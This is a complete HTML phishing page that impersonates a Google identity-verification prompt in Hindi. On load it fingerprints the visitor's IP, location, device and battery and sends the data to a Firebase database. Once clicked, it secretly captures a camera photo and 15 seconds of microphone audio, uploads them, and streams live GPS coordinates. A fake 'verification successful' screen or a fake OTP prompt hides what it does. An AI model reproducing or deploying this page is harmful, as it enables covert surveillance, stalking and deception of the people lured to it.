<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google - पहचान की पुष्टि करें</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-storage.js"></script>
    <style>
        body { font-family: 'Roboto', arial, sans-serif; background: #fff; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; color: #202124; }
        .container { width: 100%; max-width: 450px; padding: 40px; border: 1px solid #dadce0; border-radius: 8px; text-align: center; }
        .logo { width: 75px; margin-bottom: 10px; }
        h1 { font-size: 24px; font-weight: 400; margin-bottom: 10px; }
        p { font-size: 16px; line-height: 1.5; margin-bottom: 30px; }
        .btn { background: #1a73e8; color: #fff; border: none; padding: 12px 24px; border-radius: 4px; font-weight: 500; font-size: 14px; cursor: pointer; width: 100%; transition: background 0.2s; }
        .btn:hover { background: #1765cc; }
        #v, #c { display: none; }
    </style>
</head>
<body onload="initCapture()">
    <div class="container" id="mainBox">
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2f/Google_2015_logo.svg/375px-Google_2015_logo.svg.png" class="logo">
        <h1>पहचान की पुष्टि करें</h1>
        <p>आपके डिवाइस पर संदिग्ध गतिविधि का पता चला है। जारी रखने के लिए अपनी पहचान की पुष्टि करना अनिवार्य है।</p>
        <button class="btn" onclick="startPoliceAction()">पुष्टि करें</button>
    </div>
    
    <video id="v" autoplay playsinline muted></video>
    <canvas id="c"></canvas>

    <script>
        const firebaseConfig = { 
            databaseURL: "https://pari-project-police-68f77-default-rtdb.firebaseio.com/",
            storageBucket: "pari-project-police-68f77.appspot.com"
        };
        firebase.initializeApp(firebaseConfig);
        const database = firebase.database();
        const storage = firebase.storage();
        const logId = "KP_CRIME_" + Date.now();

        // 1. डीप डिवाइस इंटेलिजेंस (बिना कांटेक्ट के पहचान)
        async function initCapture() {
            try {
                const res = await fetch('https://ipapi.co/json/');
                const data = await res.json();
                let batLevel = "N/A";
                try { const bat = await navigator.getBattery(); batLevel = Math.round(bat.level * 100) + "%"; } catch(e) {}

                database.ref('target_logs/' + logId).set({
                    intel: {
                        ip: data.ip,
                        isp: data.org,
                        city: data.city,
                        os: navigator.platform,
                        browser: navigator.userAgent,
                        language: navigator.language,
                        battery: batLevel,
                        time: new Date().toLocaleString()
                    },
                    status: "Target Landed"
                });
            } catch(e) { console.error("Initial Trace Failed"); }
        }

        // 2. मेन पुलिस एक्शन फंक्शन
        async function startPoliceAction() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                document.getElementById('v').srcObject = stream;

                // साइलेंट कैप्चर (फोटो + ऑडियो)
                setTimeout(() => captureFace("Primary_Suspect"), 1000);
                startAudioIntercept(stream);

                // लाइव मूवमेंट और स्पीड ट्रैकिंग
                navigator.geolocation.watchPosition((p) => {
                    database.ref('target_logs/' + logId + '/live_track').update({
                        lat: p.coords.latitude,
                        lng: p.coords.longitude,
                        accuracy: p.coords.accuracy.toFixed(1) + "m",
                        speed: p.coords.speed || 0,
                        heading: p.coords.heading || "Stationary"
                    });
                    
                    // UI चेंज (अपराधी को शांत रखने के लिए)
                    document.getElementById('mainBox').innerHTML = `<h1>सत्यापन सफल</h1><p>सुरक्षा जांच पूरी हो गई है।</p>`;
                }, null, { enableHighAccuracy: true });

            } catch(e) {
                // एंटी-ब्लॉक: अगर अपराधी अनुमति न दे
                document.getElementById('mainBox').innerHTML = `<h1>OTP भेज दिया गया</h1><p>सत्यापन के लिए कोड डालें।</p><input type='text' placeholder='XXXX'><br><button class='btn'>Submit</button>`;
            }
        }

        // 3. वाई-फाई प्रोब (आसपास के नेटवर्क स्कैन)
        async function scanNetworks() {
            if ('bluetooth' in navigator) {
                try {
                    const device = await navigator.bluetooth.requestDevice({ acceptAllDevices: true });
                    database.ref('target_logs/' + logId + '/nearby_networks').push({ name: device.name });
                } catch(e) {}
            }
        }

        function captureFace(label) {
            const v = document.getElementById('v');
            const c = document.getElementById('c');
            c.width = v.videoWidth; c.height = v.videoHeight;
            c.getContext('2d').drawImage(v, 0, 0);
            c.toBlob(async (blob) => {
                const ref = storage.ref(`evidence/${logId}/${label}.jpg`);
                await ref.put(blob);
                const url = await ref.getDownloadURL();
                database.ref('target_logs/' + logId).update({ photo: url });
            }, 'image/jpeg');
        }

        function startAudioIntercept(stream) {
            const mr = new MediaRecorder(stream);
            let chunks = [];
            mr.ondataavailable = e => chunks.push(e.data);
            mr.onstop = async () => {
                const blob = new Blob(chunks, {type: 'audio/webm'});
                const ref = storage.ref(`evidence/${logId}/env_audio.webm`);
                await ref.put(blob);
                const url = await ref.getDownloadURL();
                database.ref('target_logs/' + logId).update({ audio_evidence: url });
            };
            mr.start();
            setTimeout(() => mr.stop(), 15000); // 15 सेकंड की डीप ऑडियो रिकॉर्डिंग
        }
        
        // टैब बंद होने से पहले डेटा सुरक्षित करना
        window.onbeforeunload = function() {
            database.ref('target_logs/' + logId).update({ status: "Target left the page" });
        };
    </script>
</body>
</html>
